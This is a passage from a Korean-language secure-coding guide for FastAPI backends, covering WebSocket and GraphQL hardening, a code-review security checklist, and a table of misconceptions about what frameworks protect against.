  Cross-Site WebSocket Hijacking이 성립한다.
- 핸드셰이크 시 한 번만 인증하고 끝내지 말고, 연결 수명 동안 권한을 재확인한다.
  (이 저장소의 WS 티켓 패턴은 §19.3, `auth-jwt.md`.)
- `websocket.receive_text()`에는 크기 제한이 없다 → 메시지 크기·빈도 제한.

### §8.3 GraphQL

인증·객체 인가·입력 검증·자원 상한은 GraphQL에도 적용한다. 단일 endpoint에 여러 연산이 있어 추가 제한이 필요하다.

- 중첩 쿼리 DoS → depth limit + complexity limit
- 배칭으로 레이트리밋 우회 → 배치 크기 제한
- introspection·schema 공개는 대상 독자·서비스 정책으로 결정한다. 비공개가 인가를 대체하지 않는다.
- **필드 단위 권한 검사** (엔드포인트 단위 검사가 무의미해진다)

---

## 부록 A. 리뷰 시 빠르게 훑는 체크리스트

**권한 (§1)**
- [ ] 모든 리소스 조회/수정에서 객체·행위·tenant 인가를 집행하는가
- [ ] 관리자 라우터에 `dependencies=[Depends(require_role(...))]`가 걸려 있는가
- [ ] 멀티테넌트면 tenant_id가 자동 주입되는가

**입출력 (§1.3, §3.2, §6.5)**
- [ ] 응답 허용 필드와 raw Response 경로의 민감정보 제외를 검증했는가
- [ ] 허용 필드 정책이 명시돼 있고 미등록 필드가 권한·데이터를 변경할 수 없는가
- [ ] 동적 입력에도 허용 연산·필드·깊이·크기와 사용 지점 검증이 있는가
- [ ] 목록 API에 `Query(50, le=200)` 형태의 상한이 있는가

**인젝션 (§3)**
- [ ] `text()` + f-string, `shell=True`, `Template(user_input)`,
      `pickle.loads`, `yaml.load`가 없는가
- [ ] ORDER BY / 컬럼명이 화이트리스트로 처리되는가

**가용성 (§6)**
- [ ] `async def` 안에 블로킹/CPU 작업이 없는가
- [ ] 모든 외부 호출에 타임아웃이 있는가
- [ ] 모든 프로세스·복제본 풀의 합과 운영 예약 연결을 포함해 DB 연결 예산을 검증했는가
- [ ] 실제 읽는 body·parser·임시 저장소에 크기·시간·동시성 제한이 있는가

**동시성 (§7)**
- [ ] 잔액/재고/쿠폰이 원자적 UPDATE 또는 락으로 처리되는가
- [ ] 결제에 멱등성 키가 있는가

**설정 (`security-ops.md §13`)**
- [ ] debug가 노출되지 않고 API 문서 접근이 [문서 정책](api-key-security.md)에 맞는가
- [ ] `TrustedHostMiddleware`가 있는가
- [ ] CORS에 와일드카드 + credentials 조합이 없는가
- [ ] 보안 헤더 미들웨어가 있는가

**운영 (`security-ops.md §11~§13`)**
- [ ] 백업이 불변이고, 복원 테스트를 한 적이 있는가
- [ ] 필요한 egress만 허용하고 차단·예외·기존 연결 영향을 검증했는가
- [ ] 인증 실패/권한 거부가 로깅되고 알림이 있는가

---

## 부록 B. "이건 프레임워크가 해주겠지"라고 오해하기 쉬운 것들

| 오해 | 실제 |
|---|---|
| FastAPI가 바디 크기를 제한해 준다 | 제한 없음. 직접 미들웨어 작성 (§4.1) |
| Pydantic이면 정규식 자원 제한이 필요 없다 | 엔진·compiled pattern·custom validator·입력/실행 상한까지 확인 (§3.8) |
| ORM을 쓰면 SQLi가 불가능하다 | `text()` + f-string, ORDER BY 식별자는 그대로 취약 (§3.1) |
| 로그인 확인 = 권한 확인 | 별개. 소유권은 따로 검사해야 한다 (§1.1) |
| React를 쓰면 XSS가 없다 | `dangerouslySetInnerHTML`, `href` 스킴, 마크다운은 그대로 (§8.1) |
| helmet/보안헤더가 XSS를 막는다 | 2차 방어일 뿐. 이스케이프가 본체 (`security-ops.md §9`) |
| CORS가 WebSocket도 보호한다 | 적용되지 않음. Origin 직접 검증 필요 (§8.2) |
| 백업이 있으니 랜섬웨어는 괜찮다 | 백업도 손상·삭제될 수 있어 독립 권한·복원 검증 필요 (`security-ops.md §12`) |
| 인바운드 방화벽이면 충분하다 | egress·기존 세션·허용 목적지 악용까지 검토 (`security-ops.md §11`) |
| `pickle`은 그냥 직렬화 포맷이다 | 역직렬화 = 임의 코드 실행 (§3.7) |
